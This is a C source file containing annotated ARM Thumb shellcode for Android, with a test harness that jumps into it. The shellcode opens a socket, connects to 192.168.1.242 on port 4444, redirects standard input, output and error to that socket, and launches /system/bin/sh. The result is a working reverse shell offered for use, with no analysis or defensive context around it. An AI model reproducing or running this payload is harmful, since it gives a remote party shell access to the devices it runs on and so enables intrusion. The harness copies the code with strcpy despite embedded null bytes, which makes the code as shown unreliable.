#include <stdio.h>
#include <string.h>

char shellcode[] = {
"\x01\x00\x8f\xe2" //	add	r0, pc, #1
"\x10\xff\x2f\xe1" //	bx	r0  
//socket(PF_INET, SOCK_STREAM, 0);
"\x01\x21" // 	mov	r1, #1
"\x00\x22" // 	mov	r2, #0
"\x02\x20" // 	mov	r0, #2
"\xff\x27" // 	mov	r7, #255
"\x1a\x37" // 	add	r7, #26
"\x01\xdf" // 	svc	0
//connect(sock, sockaddr, 0x10);
"\x04\x1c" // 	add	r4, r0, #0
"\x10\x22" // 	mov	r2, #16
"\x09\xa1" // 	add	r1, pc, #36	; (adr r0, 0x8628 <main+8>)
"\xff\x27" // 	mov	r7, #255	; 0xff
"\x1c\x37" // 	add	r7, #28
"\x01\xdf" // 	svc	0
//dup2(sock, stdin);
"\x3f\x27" // 	mov	r7, #63	; 0x3f
"\x20\x1c" // 	add	r0, r4, #0
"\x00\x21" // 	mov	r1, #0
"\x01\xdf" // 	svc	0
//dup2(sock, stdout);
"\x20\x1c" // 	add	r0, r4, #0
"\x01\x21" // 	mov	r1, #1
"\x01\xdf" // 	svc	0
//dup2(sock, stderr);
"\x20\x1c" // 	add	r0, r4, #0
"\x02\x21" // 	mov	r1, #2
"\x01\xdf" // 	svc	0
// execve("/system/bin/sh", args, env)
"\x04\xa1" // 	add	r1, pc, #16
"\x52\x40" // 	eor	r2, r2
"\x05\xa0" // 	add	r0, pc, #20
"\x08\x60" // 	str	r0, [r1, #0]
"\x0b\x27" // 	mov	r7, #11
"\x01\xdf" // 	svc	0

"\x02\x00" // 	.hword	2	// sin_fam: 2
"\x11\x5c" // 	.hword	0x5c11	// port: 4444
"\xc0\xa8\x01\xf2"  //	.byte	192, 168, 1, 242	// ip: 192.168.1.242
"\0\0\0\0"	//	.word	0	// args[0]
"\0\0\0\0" 	//	.word	0	// args[1]
"/system/bin/sh\0"
};

void main() 
{
  char c[1000];
  strcpy(c, shellcode);
  ((void (*)())(c+1))();
}

